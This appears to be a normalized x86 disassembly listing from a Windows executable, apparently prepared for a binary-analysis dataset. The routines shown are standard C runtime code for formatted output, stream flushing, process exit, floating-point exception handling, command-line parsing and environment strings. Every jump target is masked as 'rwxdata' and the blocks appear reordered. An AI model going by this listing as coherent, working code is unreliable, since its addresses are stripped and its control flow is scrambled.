mov [ ebp - 0x2c ] eax
jmp rwxdata
movsx eax bl
sub eax 0x20
je rwxdata
cmp bl 0x2a
jne rwxdata
and [ ebp - 0x8 ] 0x0
jmp rwxdata
cmp bl 0x2a
jne rwxdata
cmp bl 0x49
je rwxdata
mov ecx [ rwxdata ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je rwxdata
movsx eax bl
cmp eax 0x67
jg rwxdata
movsx eax [ ecx + eax * 8 + rwxdata ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja rwxdata
or [ ebp - 0x4 ] 0x2
jmp rwxdata
sub eax 0x3
je rwxdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068bb
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge rwxdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068bb
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge rwxdata
cmp [ esi ] 0x36
jne rwxdata
cmp bl 0x68
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40681d
add esp 0xc
jmp rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40681d
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je rwxdata
cmp eax 0x65
jge rwxdata
or [ ebp - 0x4 ] 0x80
jmp rwxdata
sub eax 0x8
je rwxdata
mov [ ebp - 0x28 ] eax
jmp rwxdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp rwxdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne rwxdata
or [ ebp - 0x4 ] 0x20
jmp rwxdata
cmp bl 0x6c
je rwxdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je rwxdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge rwxdata
cmp eax 0x58
jg rwxdata
or [ ebp - 0x4 ] 0x1
jmp rwxdata
dec eax
dec eax
je rwxdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp rwxdata
or [ ebp - 0x4 ] 0x10
jmp rwxdata
cmp bl 0x77
jne rwxdata
test [ ebp - 0x4 ] 0x20
je rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068c8
pop ecx
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068bb
test [ ebp - 0x4 ] 0x20
pop ecx
je rwxdata
dec eax
je rwxdata
jne rwxdata
mov [ ebp - 0x8 ] 0x6
jmp rwxdata
sub eax 0x5a
je rwxdata
je rwxdata
or [ ebp - 0x4 ] 0x4
jmp rwxdata
sub eax 0x3
jne rwxdata
or [ ebp - 0x4 ] edi
jmp rwxdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
test [ ebp - 0x4 ] 0x40
je rwxdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp rwxdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je rwxdata
dec eax
je rwxdata
cmp [ ebp - 0x8 ] edx
jle rwxdata
cmp bl 0x67
jne rwxdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rwxdata ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068bb
test eax eax
pop ecx
je rwxdata
sub eax 0x9
je rwxdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je rwxdata
or [ ebp - 0x4 ] 0x8
jmp rwxdata
call sub_4068bb
pop ecx
xor edx edx
call sub_4068bb
pop ecx
jmp rwxdata
call sub_4068bb
pop ecx
movzx eax ax
jmp rwxdata
call sub_4068bb
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg rwxdata
cmp [ ebp - 0x30 ] 0x0
je rwxdata
mov [ ebp - 0x38 ] 0x1
jmp rwxdata
test [ ebp - 0x3 ] 0x80
je rwxdata
or [ ebp - 0x4 ] edx
jmp rwxdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je rwxdata
cmp [ ebp - 0x8 ] 0xa3
jle rwxdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp rwxdata
cmp bl 0x67
jne rwxdata
cmp [ ebp - 0x8 ] 0x0
jne rwxdata
mov eax [ rwxdata ]
mov [ ebp - 0xc ] eax
push eax
jmp rwxdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je rwxdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
dec eax
je rwxdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp rwxdata
test [ ebp - 0x4 ] 0x830
jne rwxdata
dec eax
dec eax
je rwxdata
cdq
jmp rwxdata
cmp [ ebp - 0x8 ] 0x0
jge rwxdata
and [ ebp - 0x1c ] 0x0
jl rwxdata
push [ ebp - 0x30 ]
call sub_4068e6
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je rwxdata
dec eax
dec eax
je rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_407d1b
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je rwxdata
cmp [ edi ] 0x2d
jne rwxdata
test esi esi
jne rwxdata
push edi
call [ rwxdata ]
pop ecx
call sub_407ca0
pop ecx
jmp rwxdata
test [ ebp - 0x4 ] edi
je rwxdata
call sub_4068bb
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_4068d8
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_407dcd
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge rwxdata
jmp rwxdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je rwxdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle rwxdata
mov [ ebp - 0x8 ] 0x1
jmp rwxdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp rwxdata
test eax eax
jae rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4068bb
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je rwxdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne rwxdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp rwxdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rwxdata ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp rwxdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp rwxdata
cmp [ ebp - 0x38 ] 0x0
jne rwxdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp rwxdata
mov [ ebp - 0x38 ] 0x1
jmp rwxdata
sub eax 0xc
jne rwxdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne rwxdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne rwxdata
test ecx ecx
jne rwxdata
test ecx ecx
jne rwxdata
mov [ ebp - 0x34 ] 0x27
jmp rwxdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je rwxdata
test [ ebp - 0x4 ] 0x830
jne rwxdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rwxdata ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rwxdata ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je rwxdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne rwxdata
test bh 0x1
je rwxdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_407eb0
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_407e40
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle rwxdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je rwxdata
sub eax ecx
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
sub eax ecx
sar eax 0x1
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_406883
add esp 0x10
test bl 0x8
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_406852
add esp 0x10
test bl 0x1
je rwxdata
mov [ ebp - 0x16 ] 0x2d
jmp rwxdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp rwxdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je rwxdata
inc eax
jmp rwxdata
inc eax
inc eax
jmp rwxdata
cmp [ ebp - 0x2c ] 0x0
je rwxdata
test bl 0x4
jne rwxdata
test bl 0x2
je rwxdata
mov [ ebp - 0x16 ] 0x2b
jmp rwxdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg rwxdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne rwxdata
mov edx esi
dec esi
test edx edx
je rwxdata
mov edx esi
dec esi
test edx edx
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_406883
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_406852
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_406852
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je rwxdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_406883
add esp 0x10
mov eax edi
dec edi
test eax eax
jne rwxdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_407dcd
pop ecx
test eax eax
pop ecx
jle rwxdata
jmp rwxdata
sub_40681d
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js rwxdata
push ecx
push [ ebp + 0x8 ]
call sub_405f6a
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp rwxdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne rwxdata
sub_406852
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle rwxdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg rwxdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40681d
add esp 0xc
cmp [ esi ] 0xffffffff
je rwxdata
sub_406883
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle rwxdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg rwxdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_40681d
add esp 0xc
cmp [ edi ] 0xffffffff
je rwxdata
sub_4068e6
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
push esi
call sub_407f6d
pop ecx
test eax eax
push esi
je rwxdata
push esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_4089d2
add esp 0xc
test eax eax
je rwxdata
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push eax
call sub_407f98
pop ecx
pop ecx
jmp rwxdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_408a29
add esp 0xc
jmp rwxdata
sub_40694f
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je rwxdata
push edi
call sub_408e7b
cmp eax 0xffffffff
pop ecx
je rwxdata
xor ebp ebp
cmp edi 0x1
je rwxdata
xor eax eax
jmp rwxdata
push ebp
call sub_408d9a
pop ecx
jmp rwxdata
push 0x2
call sub_408e7b
push 0x1
mov ebp eax
call sub_408e7b
pop ecx
cmp eax ebp
pop ecx
je rwxdata
cmp edi 0x2
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_408e7b
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne rwxdata
call [ GetLastError@IAT ]
mov ebp eax
jmp rwxdata
push edi
call sub_408e01
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je rwxdata
sub_406a02
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
pop esi
retn
test al 0x8
je rwxdata
push [ esi + 0x8 ]
call sub_4068e6
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_406a2d
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne rwxdata
push esi
call sub_406a68
test eax eax
pop ecx
je rwxdata
push esi
call sub_406acd
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je rwxdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_408eb8
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_406a68
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne rwxdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je rwxdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle rwxdata
push edi
push eax
push [ esi + 0x10 ]
call sub_407a7e
add esp 0xc
cmp eax edi
jne rwxdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je rwxdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp rwxdata
sub_406acd
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rwxdata ] esi
jle rwxdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je rwxdata
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rwxdata ]
jl rwxdata
mov ecx [ eax + 0xc ]
test cl 0x83
je rwxdata
cmp [ esp + 0x10 ] 0x1
jne rwxdata
cmp [ esp + 0x10 ] 0x0
jne rwxdata
push eax
call sub_406a2d
cmp eax 0xffffffff
pop ecx
je rwxdata
test cl 0x2
je rwxdata
inc ebx
jmp rwxdata
push eax
call sub_406a2d
cmp eax 0xffffffff
pop ecx
jne rwxdata
or edi eax
sub_406b3a
mov eax [ rwxdata ]
push esi
push 0x14
test eax eax
pop esi
jne rwxdata
cmp eax esi
jge rwxdata
mov eax 0x200
jmp rwxdata
push 0x4
push eax
call sub_408f0f
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov eax esi
mov [ rwxdata ] eax
xor ecx ecx
mov eax sub_402ad0
push 0x4
push esi
mov [ rwxdata ] esi
call sub_408f0f
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov edx [ rwxdata ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rwxdata
jl rwxdata
xor edx edx
mov ecx rwxdata
push 0x1a
call sub_405f21
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne rwxdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rwxdata ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je rwxdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rwxdata
jl rwxdata
sub_406c42
push edi
push 0x1
pop edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rwxdata ] edi
mov [ rwxdata ] bl
jne rwxdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rwxdata
push rwxdata
call sub_406cdb
pop ecx
pop ecx
test ebx ebx
pop ebx
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rwxdata ] edi
call [ ExitProcess@IAT ]
push rwxdata
push rwxdata
call sub_406cdb
pop ecx
pop ecx
mov ecx [ rwxdata ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb rwxdata
pop esi
mov eax [ esi ]
test eax eax
je rwxdata
sub esi 0x4
cmp esi [ rwxdata ]
jae rwxdata
call eax
sub_406cf5
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_406e36
test eax eax
pop ecx
je rwxdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je rwxdata
cmp ebx 0x5
jne rwxdata
cmp ebx 0x1
je rwxdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
mov ecx [ rwxdata ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne rwxdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add edx ecx
push esi
cmp ecx edx
jge rwxdata
mov eax [ eax ]
mov esi [ rwxdata ]
cmp eax 0xc000008e
jne rwxdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rwxdata ]
cmp eax 0xc0000090
jne rwxdata
mov [ rwxdata ] 0x83
jmp rwxdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne rwxdata
cmp eax 0xc0000091
jne rwxdata
mov [ rwxdata ] 0x81
jmp rwxdata
push [ rwxdata ]
push 0x8
call ebx
pop ecx
mov [ rwxdata ] esi
pop ecx
pop esi
jmp rwxdata
cmp eax 0xc0000093
jne rwxdata
mov [ rwxdata ] 0x84
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
cmp eax 0xc000008d
jne rwxdata
mov [ rwxdata ] 0x85
jmp rwxdata
cmp eax 0xc000008f
jne rwxdata
mov [ rwxdata ] 0x82
jmp rwxdata
cmp eax 0xc0000092
jne rwxdata
mov [ rwxdata ] 0x86
jmp rwxdata
mov [ rwxdata ] 0x8a
sub_406e36
mov edx [ esp + 0x4 ]
mov ecx [ rwxdata ]
cmp [ rwxdata ] edx
push esi
mov eax rwxdata
je rwxdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rwxdata ]
cmp eax ecx
jae rwxdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rwxdata ]
xor eax eax
cmp [ eax ] edx
je rwxdata
cmp [ eax ] edx
jne rwxdata
retn
add eax 0xc
cmp eax esi
jae rwxdata
sub_406e79
cmp [ rwxdata ] 0x0
jne rwxdata
push esi
mov esi [ rwxdata ]
mov al [ esi ]
cmp al 0x22
jne rwxdata
call sub_40941e
cmp al 0x20
jbe rwxdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je rwxdata
mov al [ esi ]
test al al
je rwxdata
inc esi
cmp [ esi ] 0x20
ja rwxdata
cmp [ esi ] 0x22
jne rwxdata
test al al
je rwxdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe rwxdata
inc esi
jmp rwxdata
movzx eax al
push eax
call sub_409018
test eax eax
pop ecx
je rwxdata
inc esi
jmp rwxdata
sub_406ed1
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi [ rwxdata ]
xor edi edi
call sub_40941e
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_407d1b
mov esi eax
pop ecx
cmp esi ebx
mov [ rwxdata ] esi
jne rwxdata
cmp al 0x3d
je rwxdata
mov edi [ rwxdata ]
cmp [ edi ] bl
je rwxdata
push 0x9
call sub_405f21
pop ecx
push esi
call sub_407ca0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp rwxdata
inc edi
push [ rwxdata ]
call sub_4068e6
pop ecx
mov [ rwxdata ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rwxdata ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je rwxdata
add edi ebp
cmp [ edi ] bl
jne rwxdata
push ebp
call sub_407d1b
cmp eax ebx
pop ecx
mov [ esi ] eax
jne rwxdata
push edi
call sub_407ca0
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je rwxdata
pop ebp
push edi
push [ esi ]
call sub_409440
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_405f21
pop ecx
sub_406f8a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi rwxdata
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
mov edi esi
cmp [ eax ] bl
je rwxdata
call sub_40941e
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_407023
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_407d1b
mov esi eax
add esp 0x18
cmp esi ebx
jne rwxdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_407023
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rwxdata ] esi
pop edi
pop esi
mov [ rwxdata ] eax
pop ebx
leave
retn
push 0x8
call sub_405f21
pop ecx
sub_407023
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je rwxdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je rwxdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je rwxdata
test dl dl
je rwxdata
cmp dl 0x20
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
test dl dl
jne rwxdata
test dl dl
je rwxdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp rwxdata
inc [ ecx ]
test esi esi
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
test esi esi
je rwxdata
dec eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
test edi edi
je rwxdata
mov dl [ eax ]
cmp dl 0x20
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
test edi edi
je rwxdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne rwxdata
inc eax
inc ebx
jmp rwxdata
mov edx ebx
dec ebx
test edx edx
je rwxdata
test bl 0x1
jne rwxdata
cmp [ eax ] 0x5c
jne rwxdata
mov dl [ eax ]
test dl dl
je rwxdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je rwxdata
test esi esi
je rwxdata
cmp [ ebp + 0x18 ] 0x0
jne rwxdata
inc [ ecx ]
dec ebx
jne rwxdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne rwxdata
inc [ ecx ]
jmp rwxdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je rwxdata
cmp dl 0x20
je rwxdata
test esi esi
je rwxdata
mov eax edx
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
inc eax
jmp rwxdata
test esi esi
je rwxdata
cmp dl 0x9
je rwxdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_4071d7
push ecx
push ecx
mov eax [ rwxdata ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne rwxdata
cmp eax 0x1
jne rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
cmp eax 0x2
jne rwxdata
cmp esi ebx
jne rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
mov [ rwxdata ] 0x1
jmp rwxdata
xor eax eax
cmp edi ebx
jne rwxdata
cmp [ esi ] bx
mov eax esi
je rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
